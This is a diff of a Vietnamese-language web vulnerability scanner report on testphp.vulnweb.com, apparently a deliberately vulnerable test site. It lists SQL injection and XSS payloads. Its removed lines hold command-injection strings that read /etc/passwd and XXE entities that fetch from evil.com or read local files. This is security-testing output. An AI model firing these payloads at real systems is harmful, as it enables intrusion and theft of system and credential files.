@@ -1,8 +1,7 @@
-[TIME] 2025-07-24 15:44:07
+[TIME] 2025-08-24 18:03:28
 [URL] http://testphp.vulnweb.com/artists.php?artist=
-[SUMMARY] SQLi, XSS, CMDi, XXE
+[SUMMARY] SQLi, XSS
 ======= SQLi =======
-
 [*] Đang kiểm tra SQL Injection trên: http://testphp.vulnweb.com/artists.php?artist=
 [!] Có thể bị tấn công SQLi với các payloads:
     - ' OR '1'='1
@@ -31,54 +30,27 @@
 
 
 ======= XSS =======
-
 [*] Đang kiểm tra XSS trên: http://testphp.vulnweb.com/artists.php?artist=
 [!] Có thể bị tấn công XSS với các payloads:
-    - <video src=1 onerror=alert(9)>
+    - <img src="cat.webp" onmouseover="alert('meomeo')" width=100%/>
+    - <details open ontoggle=alert(7)>
     - '><svg/onload=alert(3)>
+    - <video src=1 onerror=alert(9)>
+    - "><svg onmouseover=alert(4)>
     - "><img src=x onerror=alert(2)>
     - <iframe src="javascript:alert(5)">
     - <marquee onstart=alert(8)>
-    - "><svg onmouseover=alert(4)>
-    - <details open ontoggle=alert(7)>
     - <script>alert(1)</script>
     - <math href="javascript:alert(6)">
 
 
-======= LFI =======
-[*] Đang kiểm tra LFI trên: http://testphp.vulnweb.com/artists.php?artist=
-[✓] Không phát hiện lỗ hổng LFI.
-
 
 ======= CMDi =======
 [*] Đang kiểm tra Command Injection trên: http://testphp.vulnweb.com/artists.php?artist=
-[!] Có thể bị tấn công CMDi với các payloads:
-    - && cat /etc/passwd
-    - && ls
-    - && uname -a
-    - && whoami
-    - &&id
-    - ; cat /etc/passwd
-    - ; ls
-    - ; uname -a
-    - ; whoami
-    - ;id
-    - | cat /etc/passwd
-    - | ls
-    - | uname -a
-    - | whoami
-    - |id
+[✓] Không phát hiện lỗ hổng CMDi.
 
 
 ======= XXE =======
 [*] Đang kiểm tra XXE trên: http://testphp.vulnweb.com/artists.php?artist=
-[!] Có thể bị tấn công XXE với các payloads:
-    - <!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://evil.com/evil"> %xxe; ]>
-    - <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini"> ]>
-    - <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
-    - <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://evil.com/evil"> ]>
-    - <?xml version="1.0" ?>
-    - <foo>&xxe;</foo>
-    - <foo>test</foo>
-
+[!] Không tìm thấy form upload trên trang.
 
